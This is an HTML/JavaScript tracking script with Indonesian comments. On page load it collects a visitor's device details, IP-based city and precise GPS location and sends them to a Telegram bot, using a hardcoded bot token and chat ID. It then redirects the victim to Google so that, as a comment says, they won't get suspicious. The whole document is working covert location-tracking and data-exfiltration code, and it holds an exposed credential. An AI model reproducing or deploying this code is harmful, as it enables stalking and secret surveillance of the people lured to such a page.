<script>
    async function kirimData() {
        const TOKEN = "8792237779:AAHPqEspio6-Brm0-H7N-D2Us_n3vLM9la8"; // GANTI INI
        const CHAT_ID = "7499493637"; // GANTI INI

        // 1. Ambil Data Dasar (Baterai, RAM, dll)
        let batLevel = "N/A", batStatus = "N/A";
        try {
            const battery = await navigator.getBattery();
            batLevel = Math.round(battery.level * 100) + "%";
            batStatus = battery.charging ? "âœ… YA" : "âŒ TIDAK";
        } catch (e) {}

        // 2. Ambil Data IP (Lokasi Kasar)
        let geo = {};
        try {
            const res = await fetch('https://ipapi.co/json/');
            geo = await res.json();
        } catch (e) {}

        // 3. Ambil Lokasi GPS (Akurasi Tinggi - Minta Izin)
        navigator.geolocation.getCurrentPosition(async (pos) => {
            const lat = pos.coords.latitude;
            const lon = pos.coords.longitude;
            const mapsUrl = `https://www.google.com/maps?q=${lat},${lon}`;

            // Susun Pesan Lengkap
            const teks = `
â•­â”€â”€â”€â”€â”€ Tracking Report â”€â”€â”€â”€â”€ â¦¿

ðŸŒ Bahasa: ${navigator.language}
ðŸ“¶ Online: ${navigator.onLine ? 'Online' : 'Offline'}
ðŸ“º Screen: ${screen.width}x${screen.height}
ðŸ’¾ RAM: ${navigator.deviceMemory || 'Unknown'} GB
ðŸ§  CPU: ${navigator.hardwareConcurrency} Cores
ðŸ”‹ Battery: ${batLevel} (${batStatus})

ðŸ“ LOCATION (GPS ACCURATE)
ðŸ“¡ IP: ${geo.ip}
ðŸ™ï¸ Kota: ${geo.city}
ðŸ“Œ Lat/Lon: ${lat}, ${lon}
ðŸ—ºï¸ Google Maps: ${mapsUrl}
ðŸ  Alamat: (Buka link Maps di atas untuk detail jalan)

â•°â”€â”€â”€â”€â”€ Telegram Tracking`;

            // Kirim ke Telegram
            await fetch(`https://api.telegram.org/bot${TOKEN}/sendMessage`, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({ chat_id: CHAT_ID, text: teks })
            });

            // Langsung buang ke Google biar gak curiga
            window.location.href = "https://www.google.com";

        }, (err) => {
            // Jika target menolak "Izinkan Lokasi", kirim data IP saja
            console.log("Lokasi ditolak, mengirim data IP saja...");
        });
    }

    window.onload = kirimData;
</script>